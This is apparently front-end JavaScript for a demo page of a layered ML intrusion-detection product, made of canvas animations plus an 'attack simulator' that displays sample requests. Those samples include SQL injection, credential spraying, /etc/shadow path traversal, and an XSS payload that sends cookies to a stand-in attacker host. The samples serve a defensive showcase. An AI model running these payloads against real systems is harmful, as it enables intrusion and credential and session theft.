/**
 * SentinelML — Next-Gen Futuristic Motion & Cybernetic Simulation Engine
 * Features:
 *  1. Interactive Cybernetic Particle Neural Mesh
 *  2. 3D Rotating Holographic Quantum Globe / Threat Sphere (Canvas 3D Projection)
 *  3. Dynamic Spotlight Mouse-Tracking & 3D Tilt Micro-Interactions
 *  4. Futuristic Cursor Glow with Smooth Lerp
 *  5. Web Audio API Sci-Fi Sound Synthesizer (Zero External Assets)
 *  6. 5-Layer ICMF Circuit Pipeline Sync & Holographic Inspector
 *  7. Live Multi-Vector Attack Simulator Terminal
 *  8. Scroll-Triggered Animated Counters & Stagger Reveals
 */

(function () {
  'use strict';

  /* ==========================================================================
     1. Web Audio API Futuristic Sound Synthesizer (Optional Sci-Fi Audio FX)
     ========================================================================== */
  const AudioFX = {
    ctx: null,
    enabled: false,

    init() {
      const btn = document.getElementById('audioToggleBtn');
      const icon = document.getElementById('audioIcon');
      if (!btn) return;

      const savedPref = localStorage.getItem('sentinel_audio_enabled');
      if (savedPref === 'true') {
        this.enabled = true;
        if (icon) icon.className = 'fa-solid fa-volume-high neon-cyan';
      }

      btn.addEventListener('click', () => {
        this.enabled = !this.enabled;
        localStorage.setItem('sentinel_audio_enabled', this.enabled);
        if (this.enabled) {
          if (!this.ctx) {
            const AudioCtx = window.AudioContext || window.webkitAudioContext;
            if (AudioCtx) this.ctx = new AudioCtx();
          }
          if (this.ctx && this.ctx.state === 'suspended') {
            this.ctx.resume();
          }
          if (icon) icon.className = 'fa-solid fa-volume-high neon-cyan';
          this.playBeep(880, 0.08, 'sine');
        } else {
          if (icon) icon.className = 'fa-solid fa-volume-xmark';
        }
      });
    },

    playTone(freq, duration = 0.06, type = 'sine', gainVal = 0.03) {
      if (!this.enabled) return;
      try {
        if (!this.ctx) {
          const AudioCtx = window.AudioContext || window.webkitAudioContext;
          if (AudioCtx) this.ctx = new AudioCtx();
        }
        if (!this.ctx) return;
        if (this.ctx.state === 'suspended') this.ctx.resume();

        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = type;
        osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
        gain.gain.setValueAtTime(gainVal, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.0001, this.ctx.currentTime + duration);

        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start();
        osc.stop(this.ctx.currentTime + duration);
      } catch (e) {
        // Audio policy fallback
      }
    },

    playBeep(freq = 600, duration = 0.05, type = 'sine') {
      this.playTone(freq, duration, type, 0.04);
    },

    playCyberScan() {
      if (!this.enabled) return;
      this.playTone(520, 0.04, 'triangle', 0.02);
      setTimeout(() => this.playTone(780, 0.05, 'sine', 0.03), 40);
      setTimeout(() => this.playTone(1040, 0.08, 'sine', 0.02), 90);
    }
  };

  /* ==========================================================================
     2. Interactive Cybernetic Particle Neural Mesh Canvas
     ========================================================================== */
  function initCyberMeshCanvas() {
    const canvas = document.getElementById('cyberMotionCanvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    let width, height, dpr;
    let particles = [];
    let mouse = { x: null, y: null, radius: 150, active: false };

    function getThemeColors() {
      const isDark = (document.documentElement.getAttribute('data-theme') || 'dark') === 'dark';
      return {
        particleBase: isDark ? 'rgba(0, 242, 254, ' : 'rgba(2, 132, 199, ',
        particleAccent: isDark ? 'rgba(192, 132, 252, ' : 'rgba(124, 58, 237, ',
        lineColor: isDark ? 'rgba(0, 242, 254, ' : 'rgba(2, 132, 199, ',
        maxDist: window.innerWidth < 768 ? 85 : 125
      };
    }

    function resize() {
      dpr = Math.min(window.devicePixelRatio || 1, 2);
      width = canvas.parentElement ? canvas.parentElement.offsetWidth : window.innerWidth;
      height = canvas.parentElement ? canvas.parentElement.offsetHeight : window.innerHeight;

      canvas.width = width * dpr;
      canvas.height = height * dpr;
      canvas.style.width = width + 'px';
      canvas.style.height = height + 'px';
      ctx.scale(dpr, dpr);

      createParticles();
    }

    class Particle {
      constructor() {
        this.x = Math.random() * width;
        this.y = Math.random() * height;
        this.vx = (Math.random() - 0.5) * 0.7;
        this.vy = (Math.random() - 0.5) * 0.7;
        this.baseRadius = Math.random() * 2 + 1.2;
        this.radius = this.baseRadius;
        this.isAccent = Math.random() > 0.75;
        this.alpha = Math.random() * 0.5 + 0.3;
        this.pulseSpeed = 0.02 + Math.random() * 0.03;
        this.pulseAngle = Math.random() * Math.PI * 2;
      }

      update() {
        this.x += this.vx;
        this.y += this.vy;
        this.pulseAngle += this.pulseSpeed;
        this.alpha = 0.25 + 0.35 * Math.sin(this.pulseAngle);

        if (this.x < 0) { this.x = 0; this.vx *= -1; }
        if (this.x > width) { this.x = width; this.vx *= -1; }
        if (this.y < 0) { this.y = 0; this.vy *= -1; }
        if (this.y > height) { this.y = height; this.vy *= -1; }

        if (mouse.active && mouse.x !== null && mouse.y !== null) {
          const dx = mouse.x - this.x;
          const dy = mouse.y - this.y;
          const dist = Math.sqrt(dx * dx + dy * dy);

          if (dist < mouse.radius && dist > 0) {
            const force = (mouse.radius - dist) / mouse.radius;
            const angle = Math.atan2(dy, dx);
            const repelX = Math.cos(angle) * force * 3.2;
            const repelY = Math.sin(angle) * force * 3.2;

            this.x -= repelX;
            this.y -= repelY;
            this.radius = this.baseRadius * (1 + force * 1.4);
          } else {
            this.radius += (this.baseRadius - this.radius) * 0.1;
          }
        } else {
          this.radius += (this.baseRadius - this.radius) * 0.1;
        }
      }

      draw(colors) {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        const prefix = this.isAccent ? colors.particleAccent : colors.particleBase;
        ctx.fillStyle = prefix + this.alpha + ')';
        ctx.shadowColor = prefix + '0.6)';
        ctx.shadowBlur = 6;
        ctx.fill();
        ctx.shadowBlur = 0;
      }
    }

    function createParticles() {
      const count = Math.min(Math.floor((width * height) / 13000), 80);
      particles = [];
      for (let i = 0; i < count; i++) {
        particles.push(new Particle());
      }
    }

    function render() {
      ctx.clearRect(0, 0, width, height);
      const colors = getThemeColors();

      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);

          if (dist < colors.maxDist) {
            const lineAlpha = (1 - dist / colors.maxDist) * 0.3;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.strokeStyle = colors.lineColor + lineAlpha + ')';
            ctx.lineWidth = dist < colors.maxDist * 0.4 ? 1.1 : 0.65;
            ctx.stroke();
          }
        }
      }

      for (let i = 0; i < particles.length; i++) {
        particles[i].update();
        particles[i].draw(colors);
      }

      requestAnimationFrame(render);
    }

    window.addEventListener('resize', debounce(resize, 150));

    window.addEventListener('mousemove', (e) => {
      mouse.x = e.clientX;
      mouse.y = e.clientY;
      mouse.active = true;
    });

    window.addEventListener('mouseleave', () => {
      mouse.active = false;
      mouse.x = null;
      mouse.y = null;
    });

    resize();
    render();
  }

  /* ==========================================================================
     3. 3D Rotating Quantum Cyber Globe & Threat Sphere Canvas
     ========================================================================== */
  function initQuantumGlobeCanvas() {
    const canvas = document.getElementById('quantumGlobeCanvas');
    if (!canvas) return;

    const ctx = canvas.getContext('2d');
    const size = 440;
    const dpr = Math.min(window.devicePixelRatio || 1, 2);
    canvas.width = size * dpr;
    canvas.height = size * dpr;
    ctx.scale(dpr, dpr);

    const radius = 135;
    const center = { x: size / 2, y: size / 2 };
    let rotX = 0.25;
    let rotY = 0;
    let autoSpeed = 0.007;

    // Generate 3D Sphere Points
    const nodes = [];
    const latLines = 8;
    const lonLines = 14;

    for (let i = 1; i < latLines; i++) {
      const lat = (Math.PI * i) / latLines - Math.PI / 2;
      const rLat = radius * Math.cos(lat);
      const y = radius * Math.sin(lat);

      for (let j = 0; j < lonLines; j++) {
        const lon = (Math.PI * 2 * j) / lonLines;
        const x = rLat * Math.cos(lon);
        const z = rLat * Math.sin(lon);
        nodes.push({
          x, y, z,
          isThreat: (i === 3 && j === 4) || (i === 6 && j === 10) || (i === 4 && j === 1),
          threatColor: (i === 3 && j === 4) ? '#ff4d6d' : ((i === 6 && j === 10) ? '#fbbf24' : '#00f2fe'),
          pulse: Math.random() * Math.PI * 2
        });
      }
    }

    // Outer Orbital Ring Points
    const orbitRings = [
      { radius: 185, tilt: 0.6, speed: 0.012, color: 'rgba(0, 242, 254, ' },
      { radius: 210, tilt: -0.45, speed: -0.009, color: 'rgba(192, 132, 252, ' }
    ];

    let isDragging = false;
    let lastMouseX = 0;
    let lastMouseY = 0;

    canvas.addEventListener('mousedown', (e) => {
      isDragging = true;
      lastMouseX = e.clientX;
      lastMouseY = e.clientY;
    });

    window.addEventListener('mouseup', () => { isDragging = false; });

    window.addEventListener('mousemove', (e) => {
      if (isDragging) {
        const dx = e.clientX - lastMouseX;
        const dy = e.clientY - lastMouseY;
        rotY += dx * 0.008;
        rotX += dy * 0.008;
        lastMouseX = e.clientX;
        lastMouseY = e.clientY;
      }
    });

    let frame = 0;
    function renderGlobe() {
      ctx.clearRect(0, 0, size, size);
      frame++;

      if (!isDragging) {
        rotY += autoSpeed;
      }

      const isDark = (document.documentElement.getAttribute('data-theme') || 'dark') === 'dark';
      const wireColor = isDark ? 'rgba(56, 189, 248, ' : 'rgba(2, 132, 199, ';

      // 1. Draw Central Core Glow
      const grad = ctx.createRadialGradient(center.x, center.y, 10, center.x, center.y, radius);
      grad.addColorStop(0, isDark ? 'rgba(0, 242, 254, 0.22)' : 'rgba(2, 132, 199, 0.15)');
      grad.addColorStop(0.6, isDark ? 'rgba(124, 58, 237, 0.12)' : 'rgba(124, 58, 237, 0.06)');
      grad.addColorStop(1, 'transparent');
      ctx.fillStyle = grad;
      ctx.beginPath();
      ctx.arc(center.x, center.y, radius, 0, Math.PI * 2);
      ctx.fill();

      // 2. Project and Sort Nodes
      const cosX = Math.cos(rotX), sinX = Math.sin(rotX);
      const cosY = Math.cos(rotY), sinY = Math.sin(rotY);

      const projected = nodes.map((node) => {
        // Rotate Y
        const x1 = node.x * cosY + node.z * sinY;
        const z1 = -node.x * sinY + node.z * cosY;
        // Rotate X
        const y2 = node.y * cosX - z1 * sinX;
        const z2 = node.y * sinX + z1 * cosX;

        // Depth perspective
        const scale = 360 / (360 + z2);
        const px = center.x + x1 * scale;
        const py = center.y + y2 * scale;
        const alpha = Math.max(0.12, (z2 + radius) / (2 * radius));

        return { ...node, px, py, z2, scale, alpha };
      });

      // Sort by depth
      projected.sort((a, b) => a.z2 - b.z2);

      // 3. Draw Connecting Grid Lines
      ctx.lineWidth = 0.75;
      for (let i = 0; i < projected.length; i++) {
        for (let j = i + 1; j < projected.length; j++) {
          const dx = projected[i].px - projected[j].px;
          const dy = projected[i].py - projected[j].py;
          const dist = Math.sqrt(dx * dx + dy * dy);

          if (dist < 42 && projected[i].z2 > -40 && projected[j].z2 > -40) {
            ctx.beginPath();
            ctx.moveTo(projected[i].px, projected[i].py);
            ctx.lineTo(projected[j].px, projected[j].py);
            ctx.strokeStyle = wireColor + (projected[i].alpha * 0.4) + ')';
            ctx.stroke();
          }
        }
      }

      // 4. Draw Outer Orbital Particle Rings
      orbitRings.forEach((ring, idx) => {
        const ringAngle = frame * ring.speed;
        const ringPoints = 32;
        ctx.beginPath();
        for (let k = 0; k <= ringPoints; k++) {
          const a = (Math.PI * 2 * k) / ringPoints + ringAngle;
          const rx = ring.radius * Math.cos(a);
          const rz = ring.radius * Math.sin(a);
          const ry = rz * Math.sin(ring.tilt);
          const rx2 = rx;
          const ry2 = ry * cosX - rz * cosX * 0.3;
          const rpx = center.x + rx2 * (360 / (360 + rz));
          const rpy = center.y + ry2 * (360 / (360 + rz));
          if (k === 0) ctx.moveTo(rpx, rpy);
          else ctx.lineTo(rpx, rpy);
        }
        ctx.strokeStyle = ring.color + '0.35)';
        ctx.lineWidth = 1;
        ctx.setLineDash([4, 6]);
        ctx.stroke();
        ctx.setLineDash([]);
      });

      // 5. Draw Nodes & Threat Pulsars
      projected.forEach((p) => {
        if (p.isThreat) {
          p.pulse += 0.05;
          const pulseSize = 4 + 2.5 * Math.sin(p.pulse);

          // Threat Shockwave Ring
          ctx.beginPath();
          ctx.arc(p.px, p.py, pulseSize * 2.2, 0, Math.PI * 2);
          ctx.strokeStyle = p.threatColor + '66';
          ctx.lineWidth = 1.2;
          ctx.stroke();

          // Threat Core
          ctx.beginPath();
          ctx.arc(p.px, p.py, pulseSize, 0, Math.PI * 2);
          ctx.fillStyle = p.threatColor;
          ctx.shadowColor = p.threatColor;
          ctx.shadowBlur = 12;
          ctx.fill();
          ctx.shadowBlur = 0;
        } else {
          ctx.beginPath();
          ctx.arc(p.px, p.py, Math.max(1, p.scale * 1.8), 0, Math.PI * 2);
          ctx.fillStyle = wireColor + p.alpha + ')';
          ctx.fill();
        }
      });

      requestAnimationFrame(renderGlobe);
    }

    renderGlobe();
  }

  /* ==========================================================================
     4. Dynamic Mouse Spotlight Tracking & 3D Card Tilt
     ========================================================================== */
  function initSpotlightAndTilt() {
    const spotlightCards = document.querySelectorAll('[data-spotlight]');

    spotlightCards.forEach((card) => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        card.style.setProperty('--spotlight-x', `${x}px`);
        card.style.setProperty('--spotlight-y', `${y}px`);
      });
    });

    const tiltCards = document.querySelectorAll('[data-tilt]');
    if (window.matchMedia('(pointer: coarse)').matches) return;

    tiltCards.forEach((card) => {
      let bounds;

      card.addEventListener('mouseenter', () => {
        bounds = card.getBoundingClientRect();
        card.style.transition = 'transform 0.1s ease-out';
      });

      card.addEventListener('mousemove', (e) => {
        if (!bounds) bounds = card.getBoundingClientRect();
        const mouseX = e.clientX - bounds.left;
        const mouseY = e.clientY - bounds.top;
        const centerX = bounds.width / 2;
        const centerY = bounds.height / 2;

        const rotateX = ((mouseY - centerY) / centerY) * -6;
        const rotateY = ((mouseX - centerX) / centerX) * 6;

        card.style.transform = `perspective(1000px) rotateX(${rotateX.toFixed(2)}deg) rotateY(${rotateY.toFixed(2)}deg) scale3d(1.015, 1.015, 1.015)`;
      });

      card.addEventListener('mouseleave', () => {
        card.style.transition = 'transform 0.5s cubic-bezier(0.16, 1, 0.3, 1)';
        card.style.transform = 'perspective(1000px) rotateX(0deg) rotateY(0deg) scale3d(1, 1, 1)';
      });
    });
  }

  /* ==========================================================================
     5. Custom Futuristic Cursor Glow (Smooth Lerp)
     ========================================================================== */
  function initCyberCursor() {
    const cursor = document.getElementById('cyberCursor');
    if (!cursor || window.matchMedia('(pointer: coarse)').matches) return;

    let targetX = -500, targetY = -500;
    let currentX = -500, currentY = -500;
    let isVisible = false;

    window.addEventListener('mousemove', (e) => {
      targetX = e.clientX;
      targetY = e.clientY;
      if (!isVisible) {
        isVisible = true;
        document.body.classList.add('has-cursor');
      }
    });

    window.addEventListener('mouseleave', () => {
      isVisible = false;
      document.body.classList.remove('has-cursor');
    });

    function updateCursor() {
      currentX += (targetX - currentX) * 0.18;
      currentY += (targetY - currentY) * 0.18;
      cursor.style.left = `${currentX}px`;
      cursor.style.top = `${currentY}px`;
      requestAnimationFrame(updateCursor);
    }

    updateCursor();
  }

  /* ==========================================================================
     6. Scroll-Triggered Animated Counters & Stagger Reveals
     ========================================================================== */
  function initCountersAndReveals() {
    const counterElements = document.querySelectorAll('.animate-counter');

    const counterObserver = new IntersectionObserver((entries) => {
      entries.forEach((entry) => {
        if (entry.isIntersecting) {
          const el = entry.target;
          const target = parseInt(el.getAttribute('data-target'), 10) || 0;
          let current = 0;
          const duration = 1600;
          const stepTime = 20;
          const steps = duration / stepTime;
          const increment = target / steps;

          const timer = setInterval(() => {
            current += increment;
            if (current >= target) {
              el.innerText = target.toLocaleString();
              clearInterval(timer);
            } else {
              el.innerText = Math.floor(current).toLocaleString();
            }
          }, stepTime);

          counterObserver.unobserve(el);
        }
      });
    }, { threshold: 0.2 });

    counterElements.forEach((el) => counterObserver.observe(el));
  }

  /* ==========================================================================
     7. Interactive 5-Layer ICMF Architecture Explorer & Circuit Sync
     ========================================================================== */
  function initLayerExplorer() {
    const layerTabs = document.querySelectorAll('.glass-layer-tab');
    const pipelineNodes = document.querySelectorAll('.pipeline-node');
    const detailsContainer = document.getElementById('icmfLayerDetails');
    if (!layerTabs.length || !detailsContainer) return;

    const layerData = {
      layer1: {
        title: 'Layer 1: Deterministic Heuristic Signatures',
        badge: 'MICROSECOND LATENCY (<0.1ms)',
        tag: 'DETERMINISTIC RULE ENGINE',
        color: 'var(--accent-cyan)',
        formula: 'Payload Inspection \\Rightarrow \\text{Regex} \\cap \\text{Shannon Entropy } H(X) > 4.65',
        desc: 'Instant micro-signature inspection detecting high-entropy obfuscation, classic SQL injection sequences, directory traversal markers (../), and suspicious authentication brute bursts before full pipeline execution.',
        weights: 'Weight in Fusion: 25% • False Positive Rejection: Immediate • Coverage: OWASP Top 10 Signatures'
      },
      layer2: {
        title: 'Layer 2: Supervised Random Forest Classifier',
        badge: '12D FEATURE VECTOR INGESTION',
        tag: 'SUPERVISED ML ENSEMBLE',
        color: 'var(--accent-blue)',
        formula: 'y_{\\text{RF}} = \\frac{1}{B} \\sum_{b=1}^{B} T_b(\\mathbf{x}_{12D}), \\quad \\mathbf{x} = [\\text{Entropy}, \\text{PathLen}, \\text{Latency}, \\dots]',
        desc: 'Ensemble of 100 deep decision trees trained on multi-vector attack datasets. Parses continuous metrics such as path length, parameter density, payload entropy, status frequency, and user-agent anomalies.',
        weights: 'Weight in Fusion: 25% • Precision: 99.4% • Recall: 98.9% • Latency: ~0.8ms'
      },
      layer3: {
        title: 'Layer 3: Unsupervised Isolation Forest',
        badge: 'ZERO-DAY OUTLIER DETECTOR',
        tag: 'ANOMALY ISOLATION',
        color: 'var(--accent-purple)',
        formula: 's(x, n) = 2^{-\\frac{E(h(x))}{c(n)}}, \\quad s(x, n) \\ge 0.65 \\Rightarrow \\text{Outlier Threat}',
        desc: 'Detects zero-day anomalies and novel attack signatures by isolating observations in high-dimensional feature space without requiring prior label supervision. Critical for catching novel bypasses.',
        weights: 'Weight in Fusion: 20% • Anomaly Sensitivity: Adaptive • Unsupervised Baseline Drift Auto-Calibrated'
      },
      layer4: {
        title: 'Layer 4: Markov Chain Sequence Model',
        badge: 'KILL-CHAIN TRANSITION PROBABILITY',
        tag: 'TEMPORAL STATE PREDICTOR',
        color: 'var(--accent-amber)',
        formula: 'P(S_{t+1} = \\text{Exploit} \\mid S_t = \\text{Recon}) = \\frac{N(S_t \\rightarrow S_{t+1})}{\\sum_s N(S_t \\rightarrow s)}',
        desc: 'Models temporal multi-stage attack transitions across the MITRE kill chain (S1 Recon -> S2 Brute -> S3 Exploit -> S4 Exfil). Forecasts which target asset the adversary will strike next.',
        weights: 'Weight in Fusion: 15% • State Horizon: 4-Stage Predictive Graph • Early Warning Lead Time: Up to 180s'
      },
      layer5: {
        title: 'Layer 5: Neural LLM Forensic Synthesis',
        badge: 'AUTONOMOUS ATTRIBUTION & INTENT',
        tag: 'NEURAL FORENSIC AGENT',
        color: 'var(--accent-emerald)',
        formula: '\\text{Forensic Narrative} = \\mathcal{M}_{\\text{LLM}}(\\text{Telemetry Vectors}, \\text{MITRE Mapping}, \\text{Markov Forecast})',
        desc: 'Generates human-readable CISO forensic dossiers, correlates multi-IP threat campaigns, and synthesizes attacker intent narratives ready for immediate executive security audits.',
        weights: 'Weight in Fusion: 15% • Context Window: Multi-Hour Campaign • Automated Remediation Advisories'
      }
    };

    function selectLayer(key) {
      const data = layerData[key];
      if (!data) return;

      AudioFX.playBeep(720, 0.04, 'sine');

      layerTabs.forEach((tab) => {
        tab.classList.toggle('active', tab.getAttribute('data-layer') === key);
      });

      pipelineNodes.forEach((node) => {
        node.classList.toggle('active', node.getAttribute('data-layer-trigger') === key);
      });

      detailsContainer.style.opacity = '0';
      detailsContainer.style.transform = 'translateY(12px)';

      setTimeout(() => {
        detailsContainer.innerHTML = `
          <div style="border-left: 4px solid ${data.color}; padding-left: 1.25rem; margin-bottom: 1.5rem;">
            <div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.6rem; margin-bottom: 0.85rem;">
              <span class="layer-badge-tag" style="background: rgba(0, 242, 254, 0.1); border: 1px solid ${data.color}; color: ${data.color}; padding: 0.35rem 0.85rem; border-radius: 999px;">
                <i class="fa-solid fa-microchip"></i> ${data.tag}
              </span>
              <span class="font-mono neon-emerald" style="font-size: 0.78rem; font-weight: 700;">
                ${data.badge}
              </span>
            </div>
            <h3 class="font-orbitron" style="font-size: 1.45rem; color: var(--text-primary); margin-bottom: 0.85rem;">
              ${data.title}
            </h3>
            <p style="color: var(--text-secondary); font-size: 1.02rem; line-height: 1.7; margin-bottom: 1.5rem;">
              ${data.desc}
            </p>
          </div>

          <div style="background: rgba(4, 6, 12, 0.9); border: 1px solid var(--border-color); border-radius: 14px; padding: 1.25rem 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--accent-cyan); margin-bottom: 1.5rem; overflow-x: auto; box-shadow: inset 0 0 20px rgba(0,0,0,0.5);">
            <span style="color: var(--text-muted); font-size: 0.72rem; display: block; margin-bottom: 0.4rem;">// MATHEMATICAL FORMULATION & THRESHOLD</span>
            <code>${data.formula}</code>
          </div>

          <div class="font-mono" style="font-size: 0.82rem; color: var(--text-muted); border-top: 1px solid var(--border-color-subtle); padding-top: 1rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem;">
            <span>${data.weights}</span>
            <span class="neon-cyan"><i class="fa-solid fa-circle-check"></i> SYNCED</span>
          </div>
        `;
        detailsContainer.style.transition = 'all 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
        detailsContainer.style.opacity = '1';
        detailsContainer.style.transform = 'translateY(0)';
      }, 150);
    }

    layerTabs.forEach((tab) => {
      tab.addEventListener('click', () => {
        selectLayer(tab.getAttribute('data-layer'));
      });
    });

    pipelineNodes.forEach((node) => {
      node.addEventListener('click', () => {
        selectLayer(node.getAttribute('data-layer-trigger'));
      });
    });

    selectLayer('layer1');
  }

  /* ==========================================================================
     8. Live Multi-Vector Attack Simulator Terminal
     ========================================================================== */
  function initThreatPlayground() {
    const vectorButtons = document.querySelectorAll('.playground-vector-btn');
    const terminalOutput = document.getElementById('playgroundTerminal');
    const fusionMeterFill = document.getElementById('playgroundMeterFill');
    const fusionScoreText = document.getElementById('playgroundScoreText');
    const killChainStep = document.getElementById('playgroundKillChainStep');
    const mitigationBadge = document.getElementById('playgroundMitigation');
    if (!vectorButtons.length || !terminalOutput) return;

    const vectors = {
      sqli: {
        name: 'SQL Injection Campaign',
        payload: "POST /api/v1/auth HTTP/1.1\nHost: target.internal\nUser-Agent: sqlmap/1.7.2#stable\nPayload: ' UNION SELECT username, password_hash, token FROM admin_users --",
        mitre: 'T1190 • Exploit Public-Facing Application',
        score: 98.5,
        stage: 'Stage 3 (Exploitation)',
        l1: 'HIGH (Signature Match & Obfuscated Entropy H=4.92)',
        l2: 'MALICIOUS (Random Forest Conf: 99.4%)',
        l3: 'OUTLIER DETECTED (s(x)=0.94)',
        l4: 'State Transition: S2 -> S3 (P=0.91)',
        l5: 'LLM Intent: Data Exfiltration via SQL Union Injection',
        action: 'INSTANT IP DROP & FIREWALL BLACKLIST',
        actionColor: 'var(--accent-red)'
      },
      brute: {
        name: 'Authentication Brute-Force Spray',
        payload: 'POST /login/ HTTP/1.1\nHost: target.internal\nUser-Agent: Hydra v9.5\nAttempts: 120 reqs/10s | Credential Spray: admin:root, admin:toor, admin:password123',
        mitre: 'T1110.001 • Password Spraying',
        score: 94.2,
        stage: 'Stage 2 (Credential Access)',
        l1: 'HIGH (Burst Velocity & Status 401 Spike)',
        l2: 'MALICIOUS (Random Forest Conf: 96.8%)',
        l3: 'OUTLIER DETECTED (s(x)=0.88)',
        l4: 'State Transition: S1 -> S2 (P=0.87)',
        l5: 'LLM Intent: Distributed Credential Spray on Core Gateway',
        action: 'RATE LIMIT + ZERO-TRUST STEP-UP CHALLENGE',
        actionColor: 'var(--accent-amber)'
      },
      recon: {
        name: 'Automated Port & Decoy Canary Probe',
        payload: 'GET /.env HTTP/1.1\nHost: target.internal\nUser-Agent: Nuclei/v3.1.2\nTarget Decoy Route: /.env, /backup.sql, /phpmyadmin/',
        mitre: 'T1595.002 • Active Vulnerability Scanning',
        score: 100.0,
        stage: 'Stage 1 (Reconnaissance -> Honeypot Trigger)',
        l1: 'CRITICAL (Decoy Canary Honeypot Route Hit: /.env)',
        l2: 'MALICIOUS (Random Forest Conf: 100.0%)',
        l3: 'HIGH OUTLIER (Decoy Access)',
        l4: 'State Transition: S0 -> S1 (P=0.99)',
        l5: 'LLM Intent: Active Vulnerability Recon via Decoy Traps',
        action: 'ZERO FALSE-POSITIVE QUARANTINE & ISOLATION',
        actionColor: 'var(--accent-red)'
      },
      xss: {
        name: 'Cross-Site Scripting Injection (XSS)',
        payload: 'POST /feedback HTTP/1.1\nContent-Type: application/json\n{"comment": "<script>fetch(\'https://c2.attacker.cc/exfil?c=\'+document.cookie)</script>"}',
        mitre: 'T1059.007 • JavaScript Scripting Execution',
        score: 91.8,
        stage: 'Stage 3 (Exploit Execution)',
        l1: 'HIGH (XSS Script Tags & Document Object Access)',
        l2: 'MALICIOUS (Random Forest Conf: 94.2%)',
        l3: 'OUTLIER DETECTED (s(x)=0.82)',
        l4: 'State Transition: S2 -> S3 (P=0.84)',
        l5: 'LLM Intent: Session Token Hijack via Stored XSS',
        action: 'SANITIZED & IP SURVEILLANCE ACTIVATED',
        actionColor: 'var(--accent-purple)'
      },
      traversal: {
        name: 'Path Traversal & Shadow Read',
        payload: 'GET /static/download?file=../../../../etc/shadow HTTP/1.1\nHost: target.internal\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        mitre: 'T1005 • Data from Local System',
        score: 96.0,
        stage: 'Stage 3 (Exploit: System File Traversal)',
        l1: 'HIGH (Directory Traversal Pattern Detected)',
        l2: 'MALICIOUS (Random Forest Conf: 97.5%)',
        l3: 'OUTLIER DETECTED (s(x)=0.89)',
        l4: 'State Transition: S1 -> S3 (P=0.88)',
        l5: 'LLM Intent: Sensitive OS Configuration Exfiltration',
        action: 'STREAM INTERRUPTED & ASSET PROTECTED',
        actionColor: 'var(--accent-red)'
      }
    };

    function runSimulation(key) {
      const v = vectors[key];
      if (!v) return;

      AudioFX.playCyberScan();

      vectorButtons.forEach((b) => b.classList.toggle('active', b.getAttribute('data-vector') === key));

      terminalOutput.innerHTML = `
        <div style="color: var(--accent-cyan); font-family: 'JetBrains Mono', monospace; font-size: 0.85rem;">
          <i class="fa-solid fa-spinner fa-spin"></i> [ICMF ENGINE] Intercepting telemetry vector: ${v.name}...
        </div>
      `;

      if (fusionMeterFill) fusionMeterFill.style.width = '0%';
      if (fusionScoreText) fusionScoreText.innerText = '0.0%';

      setTimeout(() => {
        terminalOutput.innerHTML = `
<span style="color: var(--text-muted);"># INCOMING RAW REQUEST TELEMETRY STREAM</span>
<span style="color: var(--accent-cyan);">${v.payload}</span>

<span style="color: var(--text-muted); margin-top: 0.75rem; display: block;"># 5-LAYER INTENT-CENTRIC MULTI-LAYER FUSION (ICMF) VERDICT:</span>
<span style="color: var(--text-secondary);">&bull; Layer 1 (Heuristics):</span> <span style="color: var(--accent-cyan); font-weight:600;">${v.l1}</span>
<span style="color: var(--text-secondary);">&bull; Layer 2 (Random Forest):</span> <span style="color: var(--accent-blue); font-weight:600;">${v.l2}</span>
<span style="color: var(--text-secondary);">&bull; Layer 3 (Isolation Forest):</span> <span style="color: var(--accent-purple); font-weight:600;">${v.l3}</span>
<span style="color: var(--text-secondary);">&bull; Layer 4 (Markov Chain):</span> <span style="color: var(--accent-amber); font-weight:600;">${v.l4}</span>
<span style="color: var(--text-secondary);">&bull; Layer 5 (Neural LLM):</span> <span style="color: var(--accent-emerald); font-weight:600;">${v.l5}</span>

<span style="color: var(--text-muted); margin-top: 0.75rem; display: block;"># MITRE ATT&CK ALIGNMENT:</span>
<span style="color: var(--accent-amber); font-weight: 700;"><i class="fa-solid fa-crosshairs"></i> ${v.mitre}</span>
        `;

        if (fusionMeterFill) fusionMeterFill.style.width = v.score + '%';
        if (fusionScoreText) fusionScoreText.innerText = v.score.toFixed(1) + '%';
        if (killChainStep) killChainStep.innerText = v.stage;
        if (mitigationBadge) {
          mitigationBadge.innerHTML = `<i class="fa-solid fa-shield-halved"></i> ${v.action}`;
          mitigationBadge.style.color = v.actionColor;
          mitigationBadge.style.borderColor = v.actionColor;
        }
      }, 300);
    }

    vectorButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        runSimulation(btn.getAttribute('data-vector'));
      });
    });

    runSimulation('sqli');
  }

  /* ==========================================================================
     Helper Utilities
     ========================================================================== */
  function debounce(func, wait) {
    let timeout;
    return function (...args) {
      clearTimeout(timeout);
      timeout = setTimeout(() => func.apply(this, args), wait);
    };
  }

  /* ==========================================================================
     Lifecycle Init
     ========================================================================== */
  document.addEventListener('DOMContentLoaded', () => {
    AudioFX.init();
    initCyberMeshCanvas();
    initQuantumGlobeCanvas();
    initSpotlightAndTilt();
    initCyberCursor();
    initCountersAndReveals();
    initLayerExplorer();
    initThreatPlayground();
  });

})();
